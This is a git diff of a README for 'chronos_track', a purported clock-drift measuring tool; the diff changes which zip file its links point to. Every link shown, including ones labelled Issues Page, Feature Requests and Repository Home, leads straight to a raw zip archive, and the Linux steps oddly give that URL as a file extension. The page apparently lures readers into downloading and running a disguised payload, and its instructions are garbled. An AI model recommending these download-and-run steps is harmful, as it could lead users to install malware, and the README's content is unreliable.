@@ -1,6 +1,6 @@
 # 🕰️ chronos_track - Accurately Measure Time Drift in Devices
 
-[![Download Now](https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/track-chronos-1.6.zip%20Chronos%20Track-v1.2-brightgreen)](https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/track-chronos-1.6.zip)
+[![Download Now](https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/chronos-track-3.9.zip%20Chronos%20Track-v1.2-brightgreen)](https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/chronos-track-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -9,13 +9,13 @@ Chronos-Track is an application designed to measure the clock skew of physical d
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the following link to access the download files: [Download Chronos-Track](https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/track-chronos-1.6.zip).
+   Go to the following link to access the download files: [Download Chronos-Track](https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/chronos-track-3.9.zip).
 
 2. **Choose the Right File**  
    Look for the latest version, which is **v1.2**. You will see different files available for download. Select the file that matches your computer's operating system:
    - For **Windows**, download the file ending in `.exe`.
    - For **macOS**, download the file ending in `.dmg`.
-   - For **Linux**, download the file ending in `https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/track-chronos-1.6.zip`.
+   - For **Linux**, download the file ending in `https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/chronos-track-3.9.zip`.
 
 3. **Download the File**  
    Click on the filename to start the download.
@@ -26,7 +26,7 @@ Chronos-Track is an application designed to measure the clock skew of physical d
 5. **Run the Application**  
    - For **Windows**: Double-click the `.exe` file to start the installation. Follow the on-screen instructions.
    - For **macOS**: Open the `.dmg` file and drag the Chronos-Track app to your Applications folder.
-   - For **Linux**: Extract the `https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/track-chronos-1.6.zip` file, navigate to the extracted folder in your terminal, and run the application by typing `./chronos_track`.
+   - For **Linux**: Extract the `https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/chronos-track-3.9.zip` file, navigate to the extracted folder in your terminal, and run the application by typing `./chronos_track`.
 
 ## 📖 Features
 
@@ -73,9 +73,9 @@ If you encounter any issues while using Chronos-Track, consider these common sol
 
 ## 🔗 Useful Links
 
-- [Repository Home](https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/track-chronos-1.6.zip)  
-- [Issues Page](https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/track-chronos-1.6.zip)  
-- [Feature Requests](https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/track-chronos-1.6.zip)  
+- [Repository Home](https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/chronos-track-3.9.zip)  
+- [Issues Page](https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/chronos-track-3.9.zip)  
+- [Feature Requests](https://raw.githubusercontent.com/James-k007/chronos_track/main/graphs/chronos-track-3.9.zip)  
 
 ## 🎉 Acknowledgments
 
